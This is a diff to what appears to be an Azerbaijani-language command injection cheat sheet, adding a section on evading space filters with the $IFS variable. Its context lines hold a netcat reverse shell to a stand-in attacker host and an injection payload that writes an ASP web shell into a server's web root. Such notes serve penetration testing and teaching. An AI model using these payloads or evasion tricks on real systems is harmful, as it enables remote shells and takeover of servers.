@@ -64,4 +64,10 @@ nc -e /bin/sh attacker.com 4444
 url=http://wahh-attacker.com/%20-O%20c:\inetpub\wwwroot\scripts\cmdasp.asp
 ```
 
+## 5. Məkan (Space) Filterlənirsə Alternativ Metodlar
+Bəzi command injection hücumları üçün əmrləri düzgün icra etmək üçün boşluq (`space`) daxil etmək lazımdır. Əgər tətbiq boşluqları filtr edirsə və hücum edilən platforma Unix əsaslıdırsa, `$IFS` mühit dəyişənindən istifadə etmək mümkündür:
+```sh
+echo$IFS"hello"$IFS"world"
+```
+Burada `$IFS` dəyişəni boşluq əvəzinə istifadə olunur və `echo hello world` əmri uğurla icra olunur.
 
